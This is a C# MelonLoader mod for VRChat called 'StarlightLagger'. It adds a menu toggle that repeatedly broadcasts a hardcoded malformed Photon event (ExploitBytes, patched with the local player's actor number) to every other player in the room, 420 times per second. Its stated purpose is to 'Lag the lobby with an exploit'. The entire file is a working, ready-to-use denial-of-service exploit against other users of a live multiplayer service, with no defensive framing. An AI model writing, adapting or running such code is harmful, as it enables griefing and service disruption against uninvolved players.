using System;
using UnityEngine;
using MelonLoader;
using RubyButtonAPI;
using Photon.Realtime;
using System.Collections;
using System.Runtime.CompilerServices;

namespace StarlightLagger
{
    public class MainClass : MelonMod
    {
        private static readonly byte[] ExploitBytes =
        {
            106, 243, 176, 179, 227, 1, 0, 0, 0, 7, 0, 255, 255, 255,
            255, 255, 255, 255, 255, 0, 255, 0, 0, 0, 0, 0, 0, 0, 0,
            12, 0, 80, 108, 97, 121, 69, 109, 111, 116, 101, 82, 80,
            67, 0, 0, 0, 0, 4, 8, 0, 2, 10, 1, 0, 5, 7, 0, 0, 0
        };

        private static readonly RaiseEventOptions RaiseEventOptions = new RaiseEventOptions
        {
            field_Public_ReceiverGroup_0 = ReceiverGroup.Others,
            field_Public_EventCaching_0 = EventCaching.DoNotCache
        };

        private static bool _invalidObject;
        private static QmToggleButton _exploitToggleButton;
        private static object _exploitCoroutine;

        public override void OnApplicationStart()
        {
            WhereDaUI().Start();
        }

        private static IEnumerator RunExploit()
        {
            do
            {
                yield return new WaitForSeconds(1);
                if (RoomManager.field_Internal_Static_ApiWorld_0 != null)
                    for (int i = 0; i < 420; i++)
                        PhotonExtensions.OpRaiseEvent(6, ExploitBytes, RaiseEventOptions, default);
                else _exploitToggleButton.SetToggleState(false, true);
            } while (_invalidObject);
        }

        private static IEnumerator WhereDaUI()
        {
            while (VRCUiManager.prop_VRCUiManager_0 == null) yield return null;
            StarlightGUI();
        }

        [MethodImpl(MethodImplOptions.AggressiveInlining)] private static void StarlightGUI()
        {
            _exploitToggleButton = new QmToggleButton("ShortcutMenu", 0, 0, "Lagger", () => 
            {
                _invalidObject = true;
                byte[] idOut = BitConverter.GetBytes(PlayerExtensions.LocalPlayer.GetActorNumber());
                Buffer.BlockCopy(idOut, 0, ExploitBytes, 5, 4);
                _exploitCoroutine = MelonCoroutines.Start(RunExploit());
            }, "OFF", () =>
            {
                _invalidObject = false;
                MelonCoroutines.Stop(_exploitCoroutine);
            }, "Lag the lobby with an exploit found by Stellar and Sypherr UwU", Color.black, Color.cyan);
        }
    }
}